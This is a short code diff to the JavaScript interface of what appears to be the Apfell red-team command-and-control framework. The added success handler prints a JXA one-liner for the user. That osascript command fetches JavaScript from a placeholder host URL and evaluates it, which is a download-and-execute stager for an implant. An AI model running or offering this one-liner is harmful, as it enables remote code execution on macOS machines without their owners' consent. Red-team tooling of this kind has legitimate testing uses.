@@ -104,4 +104,17 @@ function submit_payload(){
 }
 function submit_payload_callback(response){
     console.log(response);
+    data = JSON.parse(response);
+    if(data['status'] == "success"){
+        //print out the run usage commands
+        if( $('#payload_type').val() == 'apfell-jxa'){
+            var execution_string = "Success! YOu can now execute it with a method like the JXA oneliner:<br>";
+            execution_string = execution_string + "osascript -l JavaScript -e \"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('<b>http://someIPHere:port/output/file/name.js</b>')),$.NSUTF8StringEncoding)));<br>";
+            execution_string = execution_string + "be sure to host the file somewhere though like with the <b>Services->Host File</b> section!";
+            $('#success').html(execution_string);
+        }
+    }
+    else{
+        $('#errors').val((data['error']));
+    }
 }
